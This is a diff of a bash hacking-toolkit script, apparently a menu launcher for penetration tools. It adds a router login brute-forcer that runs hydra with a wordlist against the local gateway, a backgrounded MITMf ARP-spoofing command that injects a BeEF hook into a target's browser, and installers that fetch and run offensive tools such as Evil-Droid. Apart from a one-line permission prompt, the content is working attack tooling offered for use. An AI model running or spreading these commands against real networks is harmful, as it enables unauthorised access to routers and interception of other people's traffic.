+	clear
+	TERMINALTITLE="BRUTEFORCE LOGIN"
+	dash_calc
+	TERMINALTITLE="ONLY FOR LEGAL PURPOSES"
+	dash_calc
+	printf '\033]2;BRUTEFORCE LOGIN\a'
+	if [[ "$BI" = "" ]]
+	then
+		TT=$(ifconfig | grep "$WLANN")
+		if [[ "$TT" = "" ]]
+		then
+			bin=0
+			BI=""$RS"None"$CE""
+		else
+			bin=1
+			BI="$WLANN"
+		fi
+	fi
+	if [[ "$US" = "" ]]
+	then
+		US="admin"
+	fi
+	if [[ "$WL" = "" ]]
+	then
+		wls=0
+		WL=""$RS"None"$CE""
+	fi
+	if [[ "$RQ" = "" ]]
+	then
+		rqq=0
+		RQ=""$RS"None"$CE""
+	fi
+	if [[ "$UP" = "" ]]
+	then
+		upp=0
+		UP=""$RS"None"$CE""
+	fi
+	if [[ "$IS" = "" ]]
+	then
+		iss=0
+		IS=""$RS"None"$CE""
+	fi
+	if [[ "$FM" = "" ]]
+	then
+		FM="http-post-form"
+	fi
+	#~ echo -e ""$RS"ONLY FOR LEGAL PURPOSES"$CE""
+	echo -e ""$YS" 1"$CE") Select interface           Current:"$YS""$BI""$CE""
+	echo -e ""$YS" 2"$CE") Set username               Current:"$YS""$US""$CE""
+	echo -e ""$YS" 3"$CE") Select wordlist            Current:"$YS""$WL""$CE""
+	echo -e ""$YS" 4"$CE") Request URI:               Current:"$YS""$RQ""$CE""
+	echo -e ""$YS" 5"$CE") ^USER^ & ^PASS^ field      Current:"$YS""$UP""$CE""
+	echo -e ""$YS" 6"$CE") Invalid pass string        Current:"$YS""$IS""$CE""
+	echo -e ""$YS" 7"$CE") Form                       Current:"$YS""$FM""$CE""
+	echo -e ""$YS" 8"$CE") Open router's login page in browser"
+	echo -e ""$YS" w"$CE") Open Wireshark"
+	echo -e ""$YS" s"$CE") Start bruteforcing"
+	echo -e ""$YS"bu"$CE") Burpsuite automated tool"
+	echo -e ""$YS" i"$CE") Info"
+	echo -e ""$YS" b"$CE") Go back"
+	echo -n "Choose: "
+	read BR
+	clear
+	if [[ "$BR" = "b" || "$BR" = 00 || "$BR" = "back" ]]
+	then
+		BACKL=1
+		break
+	elif [[ "$BR" = "bu" ]]
+	then
+		burpsuite
+	elif [[ "$BR" = "w" ]]
+	then
+		wireshark & disown
+	elif [[ "$BR" = 0 ]]
+	then
+		exit
+	elif [[ "$BR" = "i" ]]
+	then
+		echo -e ""$LGYS"With hydra you can bruteforce your router's login screen."
+		echo -e "Select interface"
+		echo -e "	You need to select an interface so the script can get the gateway."
+		echo -e "Set username"
+		echo -e "	Set the username for the login screen.(e.g. admin)"
+		echo -e "Select wordlist"
+		echo -e "	Select a text file with a password on every line."
+		echo -e "Request URI"
+		echo -e "	You will find this on Wireshark. Follow the video below for instructions."
+		echo -e "	(e.g. /login.php) or (e.g. /cgi-bin/login.exe) etc etc..."
+		echo -e "^USER^ & ^PASS^ field"
+		echo -e "	You will find this on Wireshark. Follow the video below for instructions."
+		echo -e "	(e.g. username=^USER^&password=^PASS^)"
+		echo -e "Invalid pass string"
+		echo -e "	You will find this when you try to login with the wrong pass on the login page."
+		echo -e "	You need to set a word that is being printed on the screen when login fails."
+		echo -e "	(e.g. Invalid) or (e.g. Wrong) or (e.g. Please) etc etc..."
+		echo -e "	Follow the video below for instructions."
+		echo -e "Form"
+		echo -e "	(e.g. http-get-form) or (e.g. http-post-form) etc etc..."
+		echo -e ""
+		echo -e "Video-demonstration: https://www.youtube.com/watch?v=vgbP0AQ5bt4"
+		echo -e ""
+		echo -e ""$CE""
+		echo -e "$PAKTGB"
+		$READAK
+	elif [[ "$BR" = 1 ]]
+	then
+		select_interface
+		if [[ "$OUTPUT" != "" && "$OUTPUT" != 0 ]]
+		then
+			bin=1
+			BI="$OUTPUT"
+		else
+			bin=0
+		fi
+	elif [[ "$BR" = 2 ]]
+	then
+		echo -n "Username: "
+		read US
+	elif [[ "$BR" = 3 ]]
+	then
+		echo -n "Wordlist: "
+		read WL
+		if [[ ! -f "$WL" ]]
+		then
+			WL=""
+			echo -e ""$RS"Couldn't find the wordlist"$CE""
+			wls=0
+			sleep 2
+		else
+			wls=1
+		fi
+	elif [[ "$BR" = 4 ]]
+	then
+		echo -n "Request URI: "
+		read RQ
+		rqq=1
+	elif [[ "$BR" = 5 ]]
+	then
+		echo -n "^USER^ & ^PASS^ field: "
+		read UP
+		upp=1
+	elif [[ "$BR" = 6 ]]
+	then
+		echo -n "Invalid pass string: "
+		read IS
+		iss=1
+	elif [[ "$BR" = 7 ]]
+	then
+		echo -n "Form: "
+		read FM
+	elif [[ "$BR" = 8 ]]
+	then
+		if [[ "$bin" != 1 ]]
+		then
+			echo -e ""$RS"Please select an interface first"$CE""
+			sleep 3
+			continue
+		fi
+		TT=$(ifconfig | grep "$BI")
+		if [[ "$TT" = "" ]]
+		then
+			echo -e ""$RS""$BI" is not available"$CE""
+			sleep 2
+			BI=""
+			continue
+		fi
+		echo -e ""$BS"Searching gateway on "$BI""$CE"..."
+		sleep 0.5
+		GATE=$(find_gateways "$BI" interface)
+		TTT=$(is_it_an_ip "$GATE")
+		if [[ "$TTT" != 1 ]]
+		then
+			echo -e ""$RS"Couldn't find your gateway."$CE""
+			sleep 2
+			echo -e ""$RS"Make sure you are connected to a network"$CE""
+			sleep 3
+			continue
+		else
+			echo -e ""$YS"Gateway found: "$GATE""$CE""
+			sleep 1
+		fi
+		clear
+		gio open "http://"$GATE""
+		echo -e "Your browser is going to open"
+		sleep 2
+	elif [[ "$BR" = "s" ]]
+	then
+		if [[ "$bin" != 1 ]]
+		then
+			echo -e ""$RS"Please select an interface first"$CE""
+			sleep 3
+			continue
+		fi
+		if [[ "$wls" != 1 ]] 
+		then
+			echo -e ""$RS"Set a wordlist first"$CE""
+			sleep 2
+			continue
+		fi
+		TT=$(ifconfig | grep "$BI")
+		if [[ "$TT" = "" ]]
+		then
+			echo -e ""$RS""$BI" is not available"$CE""
+			sleep 2
+			BI=""
+			continue
+		fi
+		if [[ "$rqq" != 1 ]]
+		then
+			echo -e ""$RS"Please set the Request URI"$CE""
+			sleep 2
+			continue
+		fi
+		if [[ "$iss" != 1 ]]
+		then
+			echo -e ""$RS"Please set the invalid pass string"$CE""
+			sleep 2
+			continue
+		fi
+		if [[ "$upp" != 1 ]]
+		then
+			echo -e ""$RS"Please set the ^USER^ & ^PASS^ field"$CE""
+			sleep 2
+			continue
+		fi
+		if [[ "$FM" = "" ]]
+		then
+			echo -e ""$RS"Set the Form first"$CE""
+			sleep 2
+			continue
+		fi
+		echo -e ""$BS"Searching gateway on "$BI""$CE"..."
+		sleep 1
+		GATE=$(find_gateways "$BI" interface)
+		TTT=$(is_it_an_ip "$GATE")
+		if [[ "$TTT" != 1 ]]
+		then
+			echo -e ""$RS"Couldn't find your gateway."$CE""
+			sleep 2
+			echo -e ""$RS"Make sure you are connected to a network"$CE""
+			sleep 3
+			continue
+		else
+			echo -e ""$YS"Gateway found: "$GATE""$CE""
+			sleep 2
+		fi
+		clear
+		echo -e ""$RS"Do you have permission to bruteforce this network?"$CE""$YNONLY""
+		read PERM
+		if [[ "$PERM" != "y" && "$PERM" != "Y" ]]
+		then
+			echo -e ""$RS"You cannot proceed then"$CE""
+			sleep 3
+			continue
+		fi
+		hydra -l "$US" -P "$WL" -e nsr -f -V "$GATE" "$FM" ""$RQ":"$UP":"$IS""
+		echo -e "$PAKTGB"
+		$READAK
+	fi
+done
+}
 function find_gateways()
 {
+	#example: find_gateways wlan0 interface
 	FG1="$1"
 	FG2="$2"
 	if [[ "$FG1" = "" ]]
@@ -6124,6 +7265,97 @@ function find_gateways()
 		fi		
 	fi
 }
+function select_interface
+{
+	while true
+	do
+		clear
+		TERMINALTITLE="Select interface"
+		dash_calc
+		printf '\033]2;SELECT INTERFACE\a'
+		TT=$(ifconfig | grep "$WLANN:")
+		if [[ "$TT" != "" ]]
+		then
+			echo -e ""$YS" 1"$CE") "$WLANN""
+		else
+			echo -e ""$RS" 1"$CE") "$RS""$WLANN""$CE""
+		fi
+		TT=$(ifconfig | grep "$ETH:")
+		if [[ "$TT" != "" ]]
+		then
+			echo -e ""$YS" 2"$CE") "$ETH""
+		else
+			echo -e ""$RS" 2"$CE") "$RS""$ETH""$CE""
+		fi
+		echo -e ""$YS" 3"$CE") Manually type an interface"
+		echo -e ""$YS" b"$CE") Go back"
+		echo -e "Choose: "
+		read CI
+		if [[ "$CI" = 1 ]]
+		then
+			TT=$(ifconfig | grep "$WLANN:")
+			if [[ "$TT" != "" ]]
+			then
+				SINT="$WLANN"
+				OUTPUT="$SINT"
+				inter=0
+				break
+			else
+				inter=1
+				OUTPUT=0
+				echo -e ""$RS"Could not find this interface"$CE""
+				sleep 2
+				continue
+			fi
+		elif [[ "$CI" = 2 ]]
+		then
+			TT=$(ifconfig | grep "$ETH:")
+			if [[ "$TT" != "" ]]
+			then
+				SINT="$ETH"
+				OUTPUT="$SINT"
+				inter=0
+				break
+			else
+				inter=1
+				OUTPUT=0
+				echo -e ""$RS"Could not find this interface"$CE""
+				sleep 2
+				continue
+			fi
+		elif [[ "$CI" = 3 ]]
+		then
+			echo -e "Interface to use: "
+			read ITU
+			TT=$(ifconfig | grep "$ITU:")
+			if [[ "$TT" != "" ]]
+			then
+				SINT="$ITU"
+				OUTPUT="$SINT"
+				inter=0
+				break
+			else
+				echo -e ""$RS"Could not find this interface"$CE""
+				echo -e "Do you still want to use it?"$YNNO": "
+				read SU
+				if [[ "$SU" = "y" ]]
+				then
+					SINT="$ITU"
+					OUTPUT="$SINT"
+					inter=0
+					break
+				else
+					OUTPUT=0
+					continue
+				fi
+			fi
+		elif [[ "$CI" = "b" ]]
+		then
+			clear
+			break
+		fi
+	done
+}
 function donate_option
 {
 	while true
@@ -6133,7 +7365,7 @@ function donate_option
 	dash_calc
 	printf '\033]2;DONATION\a'
 	echo -e "If you found my script useful, you can buy me a coffee :)"
-	echo -e "Total lscript donations: $DONATIONS"
+	echo -e ""$LBS"Total lscript donations:"$CE" $DONATIONS"
 	echo -e ""$YS" 1"$CE") Open browser to donate"
 	echo -e ""$YS" 2"$CE") Copy donation link"
 	echo -e ""$YS" b"$CE") I don't care about your work! :P"
@@ -6141,7 +7373,7 @@ function donate_option
 	read DON
 	if [[ "$DON" = "1" ]]
 	then
-		xdg-open "https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
+		gio open "https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
 	elif [[ "$DON" = "2" ]]
 	then
 		echo -e "Donation link: https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY"
@@ -6312,17 +7544,48 @@ function ngrok_option
 }
 function geolocate_ip()
 {
+	locbool=1
+	echo -e ""$BS"Please wait..."$CE""
 	A1="$1"
 	AA1=$(is_it_an_ip "$A1")
 	if [[ "$AA1" = 1 ]]
 	then
 		country=$(curl ipinfo.io/"$A1"/country 2>/dev/null)
+		if [[ "$country" = "" ]]
+		then
+			country=""$RS"Not found"$CE""
+		fi
 		loc=$(curl ipinfo.io/"$A1"/loc 2>/dev/null)
+		if [[ "$loc" = "" ]]
+		then
+			locbool=0
+			loc=""$RS"Not found"$CE""
+		fi
 		city=$(curl ipinfo.io/"$A1"/city 2>/dev/null)
+		if [[ "$city" = "" ]]
+		then
+			city=""$RS"Not found"$CE""
+		fi
 		org=$(curl ipinfo.io/"$A1"/org 2>/dev/null)
+		if [[ "$org" = "" ]]
+		then
+			org=""$RS"Not found"$CE""
+		fi
 		postal=$(curl ipinfo.io/"$A1"/postal 2>/dev/null)
+		if [[ "$postal" = "" ]]
+		then
+			postal=""$RS"Not found"$CE""
+		fi
 		region=$(curl ipinfo.io/"$A1"/region 2>/dev/null)
+		if [[ "$region" = "" ]]
+		then
+			region=""$RS"Not found"$CE""
+		fi
 		hostname=$(curl ipinfo.io/"$A1"/hostname 2>/dev/null)
+		if [[ "$hostname" = "" ]]
+		then
+			hostname=""$RS"Not found"$CE""
+		fi
 		echo -e "     Country: $country"
 		echo -e "      Region: $region"
 		echo -e "    Location: $loc"
@@ -6330,13 +7593,24 @@ function geolocate_ip()
 		echo -e "      Postal: $postal"
 		echo -e "    Hostname: $hostname"
 		echo -e "Organization: $org"
-		echo -e ""$YS" m"$CE") Open google maps location"
+		if [[ "$locbool" = 0 ]]
+		then
+			echo -e ""$RS" m"$CE") Open google maps location"
+		else
+			echo -e ""$YS" m"$CE") Open google maps location"
+		fi
 		echo -e ""$YS" *"$CE") Go back"
 		echo -e "Choose: "
 		read ge
 		if [[ "$ge" = "m" ]]
 		then
-			xdg-open https://www.google.gr/maps/search/"$loc"/
+			if [[ "$locbool" = 0 ]]
+			then
+				echo -e ""$RS"Location was not found"$CE""
+				sleep 3
+			else
+				gio open https://www.google.gr/maps/search/"$loc"/
+			fi
 		else
 			clear
 			BACKL=1
@@ -6352,7 +7626,9 @@ while true
 do
 	#passing interface
 	IPF=$1
-	#passing mode if any
+	#passing mode if any  (1=choosable   2=only rescanable)
+	#Mode 1 is for choosing and returning the IP.
+	#Mode 2 is for echoing the scan, no choosing.
 	MODE=$2
 	export IPF
 	if [[ "$IPF" = "" ]]
@@ -6375,13 +7651,16 @@ do
 	if [[ "$T1" = "" ]]
 	then
 		#Sould rescan
-		echo -e ""$RS"Common error, retrying..."$CE""
-		sleep 2
-		clear
-		continue
+		#~ echo -e ""$RS"Common error, retrying..."$CE""
+		#~ sleep 2
+		#~ clear
+		#~ continue
+		lines=$(cat $tempfile | awk 'END{print NR}')
+		hosts=$((lines-3))
 	else
 		lines=$(cat $tempfile | awk 'END{print NR}')
 		hosts=$((lines-5))
+	fi
 		if [[ "$hosts" -le 0 ]]
 		then
 			echo -e ""$RS"No hosts found"$CE""
@@ -6443,11 +7722,23 @@ do
 					export OUTPUT
 					#~ echo "$OUTPUT"
 				fi
+			else
+				echo -e ""$YS" r"$CE") Rescan"
+				echo -e "Press "$YS"any other key"$CE" to go back"
+				read -n 1 ko
+				if [[ "$ko" = "r" ]]
+				then
+					clear
+					continue
+				else
+					BACKL=1
+					break
+				fi
 			fi
 			##########
 		fi
 		break
-	fi
+	#~ fi
 	######
 done
 
@@ -6537,6 +7828,7 @@ function browser_exploiting
 			echo -e ""$YS" 1"$CE") MITMf error: Another process running on port 53"
 			echo -e ""$YS" 2"$CE") BeEF  error: Another process listening on port 3000"
 			echo -e ""$YS" 3"$CE") MITMf error: Could not resolve Gateway's MAC"
+			echo -e ""$YS" 4"$CE") MITMf error: [Errno 98] Address already in use"
 			echo -e ""$YS" b"$CE") Go back"
 			echo -e "Choose: "
 			read AE
@@ -6572,7 +7864,19 @@ function browser_exploiting
 				$READAK
 			elif [[ "$AE" = 3 ]]
 			then
-				echo -e "I cannot fix this error. It is not my script's error but MITMf's. You can try changing interface, changing network or retrying. "
+				echo -e "The only fix on this is to retry mitmf option until it starts correctly."
+				echo -e ""
+				echo -e "$PAKTGB"
+				$READAK
+			elif [[ "$AE" = 4 ]]
+			then
+				HT=$(lsof -t -i:80)
+				if [[ "$HT" = "" ]]
+				then
+					echo -e ""$RS"Could not find the issue"$CE""
+				else
+					kill "$HT" && echo -e ""$YS"Fixed"$CE""
+				fi
 				echo -e ""
 				echo -e "$PAKTGB"
 				$READAK
@@ -6597,7 +7901,7 @@ function browser_exploiting
 				CONF=$(is_it_an_ip $LOC)
 				if [[ "$CONF" = 1 ]]
 				then
-					xdg-open http://"$LOC":3000/ui/panel
+					gio open http://"$LOC":3000/ui/panel
 				else
 					echo -e ""$RS"Could not find your local IP"$CE""
 					sleep 3
@@ -6696,7 +8000,7 @@ function browser_exploiting
 							export mitmfhook
 							cd /root/MITMf
 							clear
-							xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"
+							xterm -hold -T "MITMf" -geometry 80x15+9999+9999 -e "python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$TAR" --hsts --inject --js-url "$mitmfhook" && echo -e '' && echo -e 'Close this window manually'"  & disown
 							cd
 						else
 							echo -e ""$RS"ERROR 4. Could not find gateway. Make sure you are connected to a network on interface "$SINT""$CE""
@@ -6742,87 +8046,7 @@ function browser_exploiting
 			exit
 		elif [[ "$AEB" = 1 ]]
 		then
-			while true
-			do
-				clear
-				TERMINALTITLE="Select interface"
-				dash_calc
-				printf '\033]2;SELECT INTERFACE\a'
-				TT=$(ifconfig | grep "$WLANN:")
-				if [[ "$TT" != "" ]]
-				then
-					echo -e ""$YS" 1"$CE") "$WLANN""
-				else
-					echo -e ""$RS" 1"$CE") "$RS""$WLANN""$CE""
-				fi
-				TT=$(ifconfig | grep "$ETH:")
-				if [[ "$TT" != "" ]]
-				then
-					echo -e ""$YS" 2"$CE") "$ETH""
-				else
-					echo -e ""$RS" 2"$CE") "$RS""$ETH""$CE""
-				fi
-				echo -e ""$YS" 3"$CE") Manually type an interface"
-				echo -e ""$YS" b"$CE") Go back"
-				echo -e "Choose: "
-				read CI
-				if [[ "$CI" = 1 ]]
-				then
-					TT=$(ifconfig | grep "$WLANN:")
-					if [[ "$TT" != "" ]]
-					then
-						SINT="$WLANN"
-						inter=0
-						break
-					else
-						inter=1
-						echo -e ""$RS"Could not find this interface"$CE""
-						sleep 2
-						continue
-					fi
-				elif [[ "$CI" = 2 ]]
-				then
-					TT=$(ifconfig | grep "$ETH:")
-					if [[ "$TT" != "" ]]
-					then
-						SINT="$ETH"
-						inter=0
-						break
-					else
-						inter=1
-						echo -e ""$RS"Could not find this interface"$CE""
-						sleep 2
-						continue
-					fi
-				elif [[ "$CI" = 3 ]]
-				then
-					echo -e "Interface to use: "
-					read ITU
-					TT=$(ifconfig | grep "$ITU:")
-					if [[ "$TT" != "" ]]
-					then
-						SINT="$ITU"
-						inter=0
-						break
-					else
-						echo -e ""$RS"Could not find this interface"$CE""
-						echo -e "Do you still want to use it?"$YNNO": "
-						read SU
-						if [[ "$SU" = "y" ]]
-						then
-							SINT="$ITU"
-							inter=0
-							break
-						else
-							continue
-						fi
-					fi
-				elif [[ "$CI" = "b" ]]
-				then
-					clear
-					break
-				fi
-			done
+			select_interface
 			
 		#if inter=1 then error
 		fi
@@ -6841,29 +8065,37 @@ function settings_menu
 		TERMINALTITLE="SETTINGS"
 		dash_calc
 		printf '\033]2;SETTINGS\a'
-		echo -e ""$YS" 1"$CE") Change logo color"
-		echo -e ""$YS" 2"$CE") Howdoi settings"
 		if [[ -f "$LPATH"/settings/AWUS036ACH.txt ]]
 		then
 			read ALFA < "$LPATH"/settings/AWUS036ACH.txt
 		else
 			ALFA="no"
 		fi
-		echo -e ""$YS" 3"$CE") ALFA AWUS036ACH support                      $ALFA"
-		if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
-		then
-			read IGN < "$LPATH"/settings/ignorenegativeone.txt
-		else
-			IGN="no"
-		fi
-		echo -e ""$YS" 4"$CE") Ignore negative one when deauthing           $IGN"
 		if [[ -f "$LPATH"/settings/startmac.txt ]]
 		then
 			read STARTMAC < "$LPATH"/settings/startmac.txt
 		else
 			STARTMAC="00:11:22:33:44:55"
 		fi
+		if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
+		then
+			read IGN < "$LPATH"/settings/ignorenegativeone.txt
+		else
+			IGN="no"
+		fi
+		if [[ -f "$LPATH"/settings/arpin.txt ]]
+		then
+			read ARPIN < "$LPATH"/settings/arpin.txt
+		else
+			ARPIN="$WLANN"
+		fi
+		echo -e ""$YS" 1"$CE") Change logo color"
+		echo -e ""$YS" 2"$CE") Howdoi settings"
+		echo -e ""$YS" 3"$CE") ALFA AWUS036ACH support                      $ALFA"
+		echo -e ""$YS" 4"$CE") Ignore negative one when deauthing           $IGN"
 		echo -e ""$YS" 5"$CE") MAC to change to,when starting monitor       $STARTMAC"	
+		echo -e ""$YS" 6"$CE") Interface for arp-scan                       $ARPIN"
+		echo -e ""$YS" 7"$CE") Interface for iftop(show bandwidth)          $iftopint"
 		echo -e ""$YS" b"$CE") Go back"
 		echo -e ""$YS" 0"$CE") Exit"
 		echo -e "Choose: "
@@ -6876,6 +8108,42 @@ function settings_menu
 		elif [[ "$SET" = 0 ]]
 		then
 			exit
+		elif [[ "$SET" = 7 ]]
+		then
+			clear
+			echo -e ""$BS"Interface to be used for iftop: "$CE""
+			read IFTOP
+			IFTOPTEST=$(ifconfig | grep "$IFTOP")
+			if [[ "$IFTOPTEST" = "" ]]
+			then
+				echo -e ""$RS""$IFTOP" is not currently available."$CE""
+				echo -e "Do you still want to use $IFTOP for iftop?"$YNYES""
+				read STARP
+				if [[ "$STARP" = "n" ]]
+				then
+					IFTOP=""
+					continue
+				fi
+			fi
+			echo -e "$IFTOP" > "$LPATH"/settings/iftopint.txt
+		elif [[ "$SET" = 6 ]]
+		then
+			clear
+			echo -e ""$BS"Interface to be used for arp-scan: "$CE""
+			read ARPIN
+			ARPINTEST=$(ifconfig | grep "$ARPIN")
+			if [[ "$ARPINTEST" = "" ]]
+			then
+				echo -e ""$RS""$ARPIN" is not currently available."$CE""
+				echo -e "Do you still want to use $ARPIN for arp-scan?"$YNYES""
+				read STARP
+				if [[ "$STARP" = "n" ]]
+				then
+					ARPIN=""
+					continue
+				fi
+			fi
+			echo -e "$ARPIN" > "$LPATH"/settings/arpin.txt
 		elif [[ "$SET" = 5 ]]
 		then
 			clear
@@ -7082,7 +8350,40 @@ function main_options
 			install_arp_scan
 			clear
 		fi
-		ip_scan wlan0 2
+		if [[ -f "$LPATH"/settings/arpin.txt ]]
+		then
+			read ARPIN < "$LPATH"/settings/arpin.txt
+		else
+			ARPIN="$WLANN"
+		fi
+		if [[ "$ARPIN" = "" ]]
+		then
+			ARPIN="$WLANN"
+		fi
+		TESTARP=$(ifconfig | grep "$ARPIN")
+		if [[ "$TESTARP" = "" ]]
+		then
+			clear
+			echo -e ""$RS"$ARPIN was not found"$CE""
+			sleep 2
+			BACKL=1
+		else
+			ip_scan $ARPIN 2
+		fi
+	elif [[ "$YORNAA" = "22" ]]
+	then
+		CHECK=$(ifconfig | grep "$iftopint")
+		if [[ "$CHECK" = "" ]]
+		then
+			echo -e ""$RS"Interface "$iftopint" was not found"
+			sleep 2
+		else
+			xterm -hold -T "Iftop on $iftopint" -e "iftop -n -i $iftopint -b" & disown
+			BACKL=1
+		fi
+	elif [[ "$YORNAA" = "21" ]]
+	then
+		sqlmap_menu
 	elif [[ "$YORNAA" = "19" ]]
 	then
 		echo -e ""$BS"IP:"$CE" "
@@ -7394,6 +8695,9 @@ function main_options
 	elif [[ "$YORNAA" = "14" ]]
 	then
 		metasploit_menu
+	elif [[ "$YORNAA" = "20" ]]
+	then
+		bruteforce_router
 	elif [[ "$YORNAA" = "exit" ]]
 	then
 		kill -9 $PPID
@@ -7491,13 +8795,16 @@ check_if_ks
 		echo -e "Tool by Deltaxflux"
 		sleep 1
 		cd
-		wget https://fluxion.tk/fluxion-unstable.zip
-		apt-get install -y unzip
-		clear
-		unzip /root/fluxion*.zip -d /root
-		cd /root/fluxion/install
-		chmod +x install.sh
-		./install.sh	
+		git clone --recursive https://github.com/FluxionNetwork/fluxion.git
+		cd /root/fluxion
+		./fluxion.sh
+		#~ wget https://fluxion.tk/fluxion-unstable.zip
+		#~ apt-get install -y unzip
+		#~ clear
+		#~ unzip /root/fluxion*.zip -d /root
+		#~ cd /root/fluxion/install
+		#~ chmod +x install.sh
+		#~ ./install.sh	
 	}
 	function install_wifite
 	{
@@ -7524,7 +8831,7 @@ check_if_ks
 	function install_zatacker
 	{
 		echo -e "I cannot install Zatacker. Please google how to do that yourself."
-		echo -e "PAKTGB"
+		echo -e "$PAKTGB"
 		read
 	}
 	function install_morpheus
@@ -8071,7 +9378,7 @@ check_if_ks
 		cd
 		echo -e "Installing nWatch"
 		echo -e "Tool by Suraj"
-		git clone https://github.com/suraj-root/nWatch.gi
+		git clone https://github.com/suraj-root/nWatch.git
 		pip install scapy
 		pip install colorama
 		pip install nmap
@@ -8694,8 +10001,113 @@ check_if_ks
 	{
 		apt-get -y install arp-scan
 	}
+	function install_netool
+	{
+		foldname="opensource"
+		gitlink="https://github.com/r00t-3xp10it/netool-toolkit"
+		if [[ "$foldname" = "" ]]
+		then
+			exit
+		fi
+		if [[ -d "/root/"$foldname"" ]]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/"$foldname"
+		fi
+		cd
+		git clone $gitlink opensource
+		cd $foldname
+		chmod +x INSTALL.sh && ./INSTALL.sh
+	}
+	function install_sqlmap
+	{
+		apt-get install sqlmap
+	}
+	function install_patator
+	{
+		foldname="patator"
+		gitlink="https://github.com/lanjelot/patator"
+		if [[ "$foldname" = "" ]]
+		then
+			exit
+		fi
+		if [[ -d "/root/"$foldname"" ]]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/"$foldname"
+		fi
+		cd
+		git clone $gitlink		
+	}
+	function install_zeus
+	{
+		foldname="Zeus-Scanner"
+		gitlink="https://github.com/Ekultek/Zeus-Scanner.git"
+		if [[ "$foldname" = "" ]]
+		then
+			exit
+		fi
+		if [[ -d "/root/"$foldname"" ]]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/"$foldname"
+		fi
+		cd
+		git clone $gitlink
+		cd $foldname
+		pip install -r requirements.txt
+		pip2.7 install -r requirements.txt
+	}
+	function install_evil_droid
+	{
+		foldname="Evil-Droid"
+		gitlink="https://github.com/M4sc3r4n0/Evil-Droid.git"
+		if [[ "$foldname" = "" ]]
+		then
+			exit
+		fi
+		if [[ -d "/root/"$foldname"" ]]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/"$foldname"
+		fi
+		cd
+		git clone $gitlink
+		cd $foldname
+		chmod +x evil-droid
+	}
+	function install_nosqlmap
+	{
+		foldname="NoSQLMap"
+		gitlink="https://github.com/codingo/NoSQLMap.git"
+		if [[ "$foldname" = "" ]]
+		then
+			exit
+		fi
+		if [[ -d "/root/"$foldname"" ]]
+		then
+			echo -e "Removing old..."
+			echo -e "$PAKTC"
+			$READAK
+			rm -r /root/"$foldname"
+		fi
+		cd
+		git clone $gitlink
+		cd $foldname
+		python setup.py install
+	}
 	
-		
+	
+	
+	
 #------------------------------------
 ####################################
 defaults_l
@@ -8724,6 +10136,14 @@ then
 	WLANNM=$(cat "$LPATH"/wlanmon.txt)
 	WLANN=$(cat "$LPATH"/wlan.txt)
 	ETH=$(cat "$LPATH"/eth.txt)	
+#setting iftop's interface
+	if [[ -f "$LPATH"/settings/iftopint.txt ]]
+	then
+		read iftopint < "$LPATH"/settings/iftopint.txt
+	else
+		iftopint="$WLANN"
+	fi
+	export iftopint
 	export WLANNM
 	export WLANN
 	export ETH
